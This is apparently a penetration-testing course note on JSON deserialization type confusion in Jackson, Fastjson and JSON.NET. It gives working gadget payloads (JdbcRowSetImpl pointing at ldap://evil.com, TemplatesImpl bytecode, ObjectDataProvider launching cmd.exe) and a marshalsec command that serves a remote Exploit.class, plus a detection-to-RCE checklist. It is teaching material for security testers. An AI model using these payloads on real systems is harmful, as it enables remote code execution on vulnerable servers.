---
tags: [vapt, deserialization, json, intermediate]
difficulty: intermediate
module: "15 - Deserialization"
topic: "15.08 JSON Deserialization Type Confusion"
---

# 15.08 — JSON Deserialization Type Confusion

## What Is Type Confusion in JSON?

```
NORMAL JSON DESERIALIZATION (safe):
  {"name": "alice", "role": "user"}
  → Deserializes to a plain dict/object
  → No code execution possible
  
TYPE CONFUSION ATTACK:
  Some JSON libraries allow "$type" or "@class" annotations
  to specify the exact Java/C# class to instantiate!
  
  {"$type": "com.example.Exploit", "cmd": "id"}
  → Library instantiates com.example.Exploit with cmd="id"
  → If Exploit.setCmd() or constructor triggers code → RCE!
  
VULNERABLE LIBRARIES:
  Java: Jackson (with polymorphic typing), Fastjson, Gson (with custom adapters)
  .NET: JSON.NET (with TypeNameHandling.All)
  PHP: JMS Serializer (with metadata)
```

---

## Jackson Polymorphic Deserialization

```java
// JACKSON VULNERABLE CONFIGURATION:
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
// OR:
mapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance, 
    ObjectMapper.DefaultTyping.NON_FINAL);

// THESE ALLOW JSON LIKE:
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://evil.com:1389/Exploit",
  "autoCommit": true
}

// JdbcRowSetImpl.setAutoCommit() makes LDAP connection to evil.com!
// LDAP server serves Java class → RCE!
// This is CVE-2017-7525 and related CVEs!

// TESTING JACKSON:
// Inject @class annotation into any JSON field
// Use Burp to intercept → add @class → check for JNDI connection in Collaborator
```

---

## Fastjson Attack

```bash
# FASTJSON (popular Chinese Java JSON library):
# Vulnerable versions < 1.2.83

# VULNERABLE CODE:
# JSON.parseObject(jsonInput, Object.class);

# ATTACK PAYLOAD:
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://YOUR_COLLABORATOR.burpcollaborator.net/a",
  "autoCommit": true
}

# OR:
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["BASE64_ENCODED_MALICIOUS_CLASS"],
  "_name": "a",
  "_tfactory": {},
  "_outputProperties": {}
}

# TOOL: marshalsec (generates LDAP payload server):
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://evil.com:8000/Exploit"

# START HTTP SERVER with Exploit.class:
python3 -m http.server 8000
# Visit http://evil.com:8000/Exploit.class

# FULL CHAIN:
# 1. Send @type payload → app makes LDAP request
# 2. LDAP redirects to HTTP server
# 3. App downloads and executes Exploit.class → RCE!
```

---

## JSON.NET TypeNameHandling

```json
// .NET JSON.NET WITH TypeNameHandling.All OR Auto:

// VULNERABLE:
JsonConvert.DeserializeObject(input, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All
});

// ATTACK PAYLOAD:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c calc.exe"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}

// GENERATES PROCESS.START("cmd.exe", "/c calc.exe") → RCE!
```

---

## Detecting Type Confusion Vulnerabilities

```bash
# STEP 1: INJECT @type / $type IN ALL JSON FIELDS:
# Take any JSON body and add type annotation:
{"username": "test", "@class": "com.example.Test"}
{"username": "test", "$type": "System.Object, mscorlib"}

# STEP 2: CHECK RESPONSE:
# Error about class not found = type annotation processed!
# ClassNotFoundException = Jackson/Fastjson trying to instantiate!
# Error about "com.example.Test" = confirmed JSON type confusion!

# STEP 3: TEST WITH COLLABORATOR PAYLOAD:
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://YOUR_COLLABORATOR.burpcollaborator.net/x",
  "autoCommit": true
}

# IF COLLABORATOR RECEIVES LDAP/DNS INTERACTION → BLIND RCE POSSIBLE!

# STEP 4: ESCALATE TO RCE:
# Use marshalsec + malicious LDAP server to serve exploit class
# OR: Use ysoserial.net for .NET JSON.NET payloads
```

---

## Quick Detection Cheatsheet

```
LIBRARY     INDICATOR              TEST PAYLOAD KEY
────────────────────────────────────────────────────────
Jackson     @class / @type         "@class": "com.sun...."
Fastjson    @type                  "@type": "com.sun...."
JSON.NET    $type                  "$type": "System...."
Gson        (generally safe, no type annotations)
JMS Ser.    _type / rs:type        (metadata-based)
```

---

## Related Notes
- [[01 - What is Serialization and Deserialization]] — fundamentals
- [[02 - Java Deserialization ysoserial]] — Java RCE chains
- [[05 - .NET Deserialization]] — JSON.NET TypeNameHandling
- [[12 - Defense Avoid Untrusted Deserialization]] — defense
